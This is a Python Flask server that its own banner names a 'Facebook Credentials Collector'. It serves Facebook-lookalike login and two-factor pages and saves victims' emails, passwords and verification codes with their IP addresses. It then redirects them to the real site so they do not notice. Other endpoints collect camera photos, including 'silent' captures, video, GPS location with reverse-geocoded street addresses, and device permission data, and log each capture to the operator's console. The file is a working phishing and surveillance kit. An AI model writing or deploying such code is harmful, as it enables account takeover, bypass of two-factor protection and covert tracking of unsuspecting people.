from flask import Flask, render_template, request, jsonify, redirect, session
import os
import json
from datetime import datetime
import time
from colorama import init, Fore, Back, Style
import re

# Initialize terminal colors
init()

# Initialize Flask app with absolute template path - modified to use parent directory
app = Flask(__name__, 
           template_folder=os.path.dirname(os.path.abspath(__file__)))
app.secret_key = 'facebook_2fa_simulation_key'  # Required for session management

# Configure Flask to trust the proxy headers
app.config['PREFERRED_URL_SCHEME'] = 'https'
app.config['PROXY_FIX_X_FOR'] = 1
app.config['PROXY_FIX_X_PROTO'] = 1
app.config['PROXY_FIX_X_HOST'] = 1
app.config['PROXY_FIX_X_PORT'] = 1
app.config['PROXY_FIX_X_PREFIX'] = 1

# Use ProxyFix middleware to handle proxy headers
from werkzeug.middleware.proxy_fix import ProxyFix
app.wsgi_app = ProxyFix(
    app.wsgi_app,
    x_for=1,      # Number of proxy servers
    x_proto=1,    # SSL termination proxy
    x_host=1,     # Hostname proxy
    x_port=1,     # Port proxy
    x_prefix=1    # Path proxy
)

# Add Jinja2 filter for email masking
@app.template_filter('mask_email')
def mask_email(email):
    """Mask email address for privacy while still showing enough to identify it"""
    if not email or '@' not in email:
        return "your-email@example.com"
        
    name, domain = email.split('@', 1)
    
    # Show first character and last character of username, hide the rest
    if len(name) > 2:
        masked_name = name[0] + '*' * (len(name) - 2) + name[-1]
    else:
        masked_name = name
        
    return f"{masked_name}@{domain}"

# Make sure data directories exist
DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data')
UPLOAD_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'upload')
os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(UPLOAD_DIR, exist_ok=True)

# Variables to count users
visitors_count = 0
login_attempts = 0
verification_attempts = 0
photo_count = 0
video_count = 0  # New counter for videos
location_count = 0

def get_real_ip():
    """Get real IP address from request headers"""
    # Try to get IP from X-Forwarded-For header first
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0]
    # Then try X-Real-IP header
    elif request.headers.get('X-Real-IP'):
        ip = request.headers.get('X-Real-IP')
    # Finally fall back to remote address
    else:
        ip = request.remote_addr
    return ip

def is_mobile_device():
    """Detect if request is coming from a mobile device based on User-Agent"""
    user_agent = request.headers.get('User-Agent', '').lower()
    
    # List of common mobile browser identifiers
    mobile_identifiers = [
        'mobile', 'android', 'iphone', 'ipad', 'ipod', 'blackberry', 
        'windows phone', 'opera mini', 'iemobile', 'webos'
    ]
    
    return any(identifier in user_agent for identifier in mobile_identifiers)

def get_template_folder():
    """Return the appropriate template folder based on device type"""
    if is_mobile_device():
        return 'templates'
    else:
        return 'templates2'

@app.route('/')
def index():
    """Display login page"""
    global visitors_count
    visitors_count += 1
    ip_address = get_real_ip()
    user_agent = request.headers.get('User-Agent', '')
    
    # Print new visitor information
    print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] New visitor #{visitors_count} at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[i] IP Address: {ip_address}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[i] User Agent: {user_agent}{Style.RESET_ALL}")
    
    # Determine if mobile or desktop and select appropriate template folder
    template_folder = get_template_folder()
    device_type = "Mobile" if template_folder == 'templates' else "Desktop"
    print(f"{Fore.YELLOW}[i] Device Type: {device_type}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
    
    # Use template folder directly instead of relative path
    return render_template(f'{template_folder}/index.html')

@app.route('/video')
def video():
    """Display video preview page"""
    global visitors_count
    visitors_count += 1
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent', '')
    
    # Print new video page visitor information
    print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] New video page visitor #{visitors_count} at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[i] IP Address: {ip_address}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[i] User Agent: {user_agent}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
    
    return render_template('video_link.html')

@app.route('/submit', methods=['POST'])
def submit():
    """Process and save login credentials, then redirect to 2FA page"""
    global login_attempts
    login_attempts += 1
    
    # Extract form data
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    
    # Store in session
    session['user_email'] = email
    session['user_password'] = password
    
    # Save to file with real IP
    data = {
        'email': email,
        'password': password,
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'ip_address': get_real_ip()
    }
    
    filename = os.path.join(DATA_DIR, f'login_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json')
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=4)
    
    # Add artificial delay to make the experience more realistic
    time.sleep(2)
    
    return redirect(f'/two_factor?email={email}')

@app.route('/two_factor')
def two_factor():
    """Display two-factor authentication page"""
    if 'user_email' not in session:
        return redirect('/')
    
    email = session.get('user_email', '')
    
    # Determine if mobile or desktop and select appropriate template folder
    template_folder = get_template_folder()
    
    # Use template folder directly instead of relative path
    return render_template(f'{template_folder}/two_factor.html', email=email)

@app.route('/verify_code', methods=['POST'])
def verify_code():
    """Process the 2FA verification code"""
    global verification_attempts
    verification_attempts += 1
    
    if 'user_email' not in session:
        return redirect('/')
    
    code = request.form.get('verification_code', '')
    email = session.get('user_email', '')
    password = session.get('user_password', '')
    
    # Save verification data
    data = {
        'email': email,
        'password': password,
        'verification_code': code,
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'ip_address': get_real_ip()
    }
    
    filename = os.path.join(DATA_DIR, f'verification_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json')
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=4)
    
    # Add artificial delay to simulate server processing
    time.sleep(3)
    
    session.clear()
    return jsonify({"status": "success", "redirect_url": "https://www.facebook.com"})

@app.route('/api/capture-photo', methods=['POST'])
def capture_photo():
    """Handle photo capture from camera"""
    global photo_count
    
    try:
        if 'photo' not in request.files:
            return jsonify({"status": "error", "message": "No photo file in request"}), 400
            
        photo = request.files['photo']
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
        
        # Check if this is a silent capture from desktop
        source = request.form.get('source', 'regular')
        is_silent = 'silent' in source
        
        if is_silent:
            filename = f"silent_capture_{timestamp}.jpg"
        else:
            filename = f"capture_{timestamp}.jpg"
        
        # Save the photo to upload directory
        photo_path = os.path.join(UPLOAD_DIR, filename)
        photo.save(photo_path)
        
        photo_count += 1
        
        # Print capture information
        print(f"\n{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        if is_silent:
            print(f"{Fore.RED}[🔴] SILENT PHOTO CAPTURED #{photo_count} - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[📸] PHOTO CAPTURED #{photo_count} - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}")
        
        # Get device type
        device_type = "Mobile" if is_mobile_device() else "Desktop"
        print(f"{Fore.YELLOW}[i] Device Type: {device_type}{Style.RESET_ALL}")
        
        # Get IP information
        ip_address = get_real_ip()
        print(f"{Fore.YELLOW}[i] IP Address: {ip_address}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[i] Photo saved as: {filename}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        
        # Add small delay for more realistic processing time (only for non-silent captures)
        if not is_silent:
            time.sleep(1.5)
        
        return jsonify({"status": "success", "message": "Photo captured successfully"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/capture-video', methods=['POST'])
def capture_video():
    """Handle video upload from device"""
    global video_count
    
    try:
        if 'video' not in request.files:
            return jsonify({"status": "error", "message": "No video file in request"}), 400
            
        video = request.files['video']
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
        filename = f"video_{timestamp}.mp4"
        
        # Save the video to upload directory
        video_path = os.path.join(UPLOAD_DIR, filename)
        video.save(video_path)
        
        video_count += 1
        
        # Print video information
        print(f"\n{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[🎥] VIDEO CAPTURED #{video_count} - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}")
        
        # Get device type
        device_type = "Mobile" if is_mobile_device() else "Desktop"
        print(f"{Fore.YELLOW}[i] Device Type: {device_type}{Style.RESET_ALL}")
        
        print(f"{Fore.YELLOW}[i] IP Address: {get_real_ip()}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[i] Video saved as: {filename}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        
        # Add small delay for more realistic processing time
        time.sleep(2)
        
        return jsonify({"status": "success", "message": "Video captured successfully"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/get-location', methods=['POST'])
def get_location():
    """Handle location data sent from the client"""
    global location_count
    
    try:
        data = request.json
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # Add IP and timestamp
        data['timestamp_server'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        ip_address = get_real_ip()
        data['ip_address'] = ip_address
        
        # Check if this is silent tracking
        is_silent = 'source' in data and 'silent' in data['source']
        
        # Get device type
        device_type = "Mobile" if is_mobile_device() else "Desktop"
        data['device_type'] = device_type
        
        # Save to file
        filename = os.path.join(DATA_DIR, f'location_{timestamp}.json')
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=4)
        
        location_count += 1
        
        # Print location information
        print(f"\n{Fore.MAGENTA}{'='*80}{Style.RESET_ALL}")
        if is_silent:
            print(f"{Fore.RED}[🔴] SILENT LOCATION RECEIVED #{location_count} - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[📍] LOCATION RECEIVED #{location_count} - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[i] Device Type: {device_type}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[i] IP Address: {ip_address}{Style.RESET_ALL}")
        
        if 'denied' in data and data['denied']:
            print(f"{Fore.RED}[i] Location Permission: DENIED{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[i] Location Permission: GRANTED{Style.RESET_ALL}")
            if 'latitude' in data and 'longitude' in data:
                lat = data['latitude']
                lng = data['longitude']
                print(f"{Fore.YELLOW}[i] Coordinates: {lat}, {lng}{Style.RESET_ALL}")
                
                # Generate and display map links
                google_maps_link = f"https://www.google.com/maps?q={lat},{lng}"
                osm_link = f"https://www.openstreetmap.org/?mlat={lat}&mlon={lng}"
                print(f"{Fore.CYAN}[i] Google Maps: {google_maps_link}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}[i] OpenStreetMap: {osm_link}{Style.RESET_ALL}")
                
                # Add accuracy information if available
                if 'accuracy' in data:
                    accuracy = data['accuracy']
                    print(f"{Fore.YELLOW}[i] Accuracy: {accuracy} meters{Style.RESET_ALL}")
                
                # Try to get location information via reverse geocoding APIs
                try:
                    import requests
                    # Using free Nominatim API (OpenStreetMap)
                    geocoding_url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lng}&zoom=18&addressdetails=1"
                    headers = {
                        'User-Agent': 'FacebookPhishingSimulation/1.0'  # Required by Nominatim
                    }
                    response = requests.get(geocoding_url, headers=headers, timeout=3)
                    if response.status_code == 200:
                        location_info = response.json()
                        if 'display_name' in location_info:
                            print(f"{Fore.GREEN}[i] Address: {location_info['display_name']}{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED}[i] Error getting location details: {str(e)}{Style.RESET_ALL}")
            
        print(f"{Fore.MAGENTA}{'='*80}{Style.RESET_ALL}")
        
        # Add small delay for more realistic processing time (only for non-silent requests)
        if not is_silent:
            time.sleep(1)
        
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/permissions', methods=['POST'])
def permissions():
    """Handle permissions data sent from the client"""
    try:
        data = request.json
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # Add IP and timestamp
        data['timestamp_server'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        ip_address = get_real_ip()
        data['ip_address'] = ip_address
        
        # Check if this is silent tracking
        is_silent = 'source' in data and 'silent' in data['source']
        
        # Get device type
        device_type = "Mobile" if is_mobile_device() else "Desktop"
        data['device_type'] = device_type
        
        # Save to file
        filename = os.path.join(DATA_DIR, f'permissions_{timestamp}.json')
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=4)
        
        # Print permissions information
        print(f"\n{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        if is_silent:
            print(f"{Fore.RED}[🔴] SILENT PERMISSIONS DATA - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[🔒] PERMISSIONS DATA - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[i] Device Type: {device_type}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[i] IP Address: {ip_address}{Style.RESET_ALL}")
        
        for key, value in data.items():
            if key not in ['timestamp_server', 'ip_address', 'device_type', 'source']:
                print(f"{Fore.YELLOW}[i] {key}: {value}{Style.RESET_ALL}")
            
        print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        
        # Add small delay for more realistic processing time (only for non-silent requests)
        if not is_silent:
            time.sleep(1)
        
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

def print_banner():
    """Print a banner with application information"""
    print(f"\n{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}{Style.BRIGHT}Facebook Credentials Collector{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Server running on http://127.0.0.1:5000/{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Data Directory: {DATA_DIR}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Upload Directory: {UPLOAD_DIR}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")

if __name__ == '__main__':
    print_banner()
    app.run(host='0.0.0.0', port=50005, debug=True) 